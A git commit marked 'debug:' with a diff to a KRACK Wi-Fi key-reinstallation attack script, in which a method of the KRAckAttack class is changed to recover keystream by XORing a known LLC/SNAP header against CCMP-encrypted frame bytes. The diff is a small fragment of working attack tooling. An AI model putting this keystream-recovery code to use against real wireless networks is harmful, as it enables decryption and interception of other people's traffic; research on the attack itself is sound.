594b84097de965302d733586bdbc8705090a2909
611410066 <10sun19991119@gmail.com>
2023-06-14 17:43:22 +0800

    debug:

--- krackattack/krack-all-zero-tk.py
+++ krackattack/krack-all-zero-tk.py
@@ -327,11 +327,18 @@ class KRAckAttack():
 				encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
 				keystream = xorstr(plaintext, encrypted)
 			else:
-				plaintext = b"\xaa\xaa\x03\x00\x00\x00"
-				print(type(p[Dot11CCMP].data[:len(plaintext)]))
-				print(p[Dot11CCMP].data[:len(plaintext)])
-				# plaintext = b"\xaa\xaa\x03\x00\x00\x00"
-				# encrypted = bytes(p[Dot11CCMP].data[:len(plaintext)])
+				try:
+
+					plaintext = b"\xaa\xaa\x03\x00\x00\x00"
+					encrypted = p[Dot11CCMP].data[:len(plaintext)]
+					tmp = []
+					for i in range(len(plaintext)):
+						tmp.append(plaintext[i]^encrypted[i])
+					keystream = bytes(tmp)
+					print(keystream)
+				except:
+					print('exit !')
+					return
 
 			iv = dot11_get_iv(p)
 			if iv <= 1: log(STATUS, "Ciphertext: " + encrypted, showtime=False)
